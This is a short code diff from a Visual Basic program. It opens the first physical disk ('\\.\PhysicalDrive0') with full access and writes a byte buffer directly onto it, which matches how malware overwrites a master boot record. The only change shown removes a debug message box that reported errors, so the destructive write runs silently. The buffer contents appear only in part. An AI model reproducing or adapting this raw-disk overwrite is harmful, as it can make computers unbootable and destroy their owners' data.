@@ -45,6 +45,5 @@ Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H55) & Ch
 
     hFile = CreateFile("\\.\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, 0&, OPEN_EXISTING, 0&, 0&)
     WriteFile hFile, buffer(0), ubound(buffer)+1, bytesWritten, 0&
-	msgbox err.lastdllerror
     CloseHandle hFile
 End Sub
